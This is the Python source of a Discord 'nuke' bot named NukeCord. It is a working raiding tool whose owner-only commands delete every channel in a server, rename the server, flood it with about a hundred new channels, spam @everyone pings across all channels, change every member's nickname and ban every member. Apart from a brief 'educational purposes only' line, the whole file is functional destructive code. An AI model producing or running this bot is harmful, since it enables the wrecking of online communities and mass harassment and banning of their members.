print("[~] Do nc!duck to get all commands")
import discord 
from discord.ext import commands
import json, os
bot = commands.Bot(command_prefix="nc!")
bot.remove_command("help")
f = open("config.json", "r")
x = f.read()
y = json.loads(x)
TOKEN = y["token"]
OMG = y["your_id"]
ID = int(OMG)


@bot.event 
async def on_ready():
    print(f"[!] Logged in as {bot.user}")


@bot.command()
async def duck(ctx):
    if ctx.author.id == ID:
        embed = discord.Embed(title="This bot is running NukeCord", description="This is made for educational purposes only! Do never nuke servers of innocent people!\n__List of commands:__\n```\nnc!nuke <text> | Nukes the current server and using the provided text\nnc!spam <text> | Spams a text in every channel including ping\nnc!nicknames <name> | Changes the nickname of everyone\nnc!ban | Bans all members\n```", color=0x36393e)
        embed.set_thumbnail(url="https://i.vgy.me/8LslSF.png")
        await ctx.send(embed=embed)




@bot.command()
@commands.guild_only()
async def nuke(ctx, *, arg):
    if ctx.author.id == ID:
        for channel in ctx.guild.channels:
            await channel.delete()
        await ctx.guild.edit(name=arg)
        x = 100
        while x >= 0:
            await ctx.guild.create_text_channel(arg)
            x = int(x) -1

@bot.command()
@commands.guild_only()
async def spam(ctx, *, arg):
    if ctx.author.id == ID:
        i = 100
        while i >= 0:
            for channel in ctx.guild.channels:
                await channel.send(f"{arg} @everyone")
            i = int(i) -1
            
@bot.command()
@commands.guild_only()
async def nicknames(ctx, *, arg) :
    if ctx.author.id == ID:
        for member in ctx.guild.members:
            await member.edit(nick=arg)

@bot.command()
@commands.guild_only()
async def ban(ctx):
    if ctx.author.id == ID:
        for member in ctx.guild.members:
            await member.ban(reason=None)


bot.run(TOKEN)
